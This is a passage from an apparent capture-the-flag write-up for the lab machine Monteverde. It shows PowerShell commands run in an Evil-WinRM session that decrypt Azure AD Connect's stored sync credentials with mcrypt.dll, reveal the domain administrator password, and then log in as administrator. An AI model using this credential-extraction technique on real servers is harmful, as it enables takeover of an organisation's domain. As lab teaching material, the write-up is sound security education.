  <parameter name="forest-name" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
  <parameter name="sign-and-seal" type="string" use="connectivity" dataType="String">1</parameter>
  <parameter name="crl-check" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="ssl-bind" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="simple-bind" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="Connector.GroupFilteringGroupDn" type="string" use="global" dataType="String" />
  <parameter name="ADS_UF_ACCOUNTDISABLE" type="string" use="global" dataType="String" intrinsic="1">0x2</parameter>
  <parameter name="ADS_GROUP_TYPE_GLOBAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000002</parameter>
  <parameter name="ADS_GROUP_TYPE_DOMAIN_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
  <parameter name="ADS_GROUP_TYPE_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
  <parameter name="ADS_GROUP_TYPE_UNIVERSAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000008</parameter>
  <parameter name="ADS_GROUP_TYPE_SECURITY_ENABLED" type="string" use="global" dataType="String" intrinsic="1">0x80000000</parameter>
  <parameter name="Forest.FQDN" type="string" use="global" dataType="String" intrinsic="1">MEGABANK.LOCAL</parameter>
  <parameter name="Forest.LDAP" type="string" use="global" dataType="String" intrinsic="1">DC=MEGABANK,DC=LOCAL</parameter>
  <parameter name="Forest.Netbios" type="string" use="global" dataType="String" intrinsic="1">MEGABANK</parameter>
</parameter-values>
 <password-hash-sync-config>
            <enabled>1</enabled>
            <target>{B891884F-051E-4A83-95AF-2544101C9083}</target>
         </password-hash-sync-config>
</adma-configuration>
```
Check `$crypted`:
```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $crypted
8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g95aWEcUSzl7mTXwR4Pe3uvsf2P8Oafih7cjjsubFxqBioXBUIuP+BPQCETPAtccl7BNRxKb2aGQ=
```
Step 4 done, let's continue with Step 5:
```
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
```
In our WinRM:
```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $km.LoadKeySet($entropy, $instance_id, $key_id)
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $key = $null
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $km.GetActiveCredentialKey([ref]$key)
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $km.GetActiveCredentialKey([ref]$key)
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $key2 = $null
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $km.GetKey(1, [ref]$key2)
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $decrypted = $null
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
```
Now we move on to Step 6:
```
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
```
```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
```
Step 6 completed smoothly, on to the big reveal in Step 7:
```
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```
In WinRM:
```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> Write-Host ("Domain: " + $domain.Domain)
Domain: MEGABANK.LOCAL
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> Write-Host ("Username: " + $username.Username)
Username: administrator
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> Write-Host ("Password: " + $password.Password)
Password: d0m@in4dminyeah!
```
All right! :)

### Priv: Shell as admin

```
kali@kali:~$ evil-winrm -i monteverde.htb -u administrator -p 'd0m@in4dminyeah!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megabank\administrator
```

Wasn't that hard, was it?
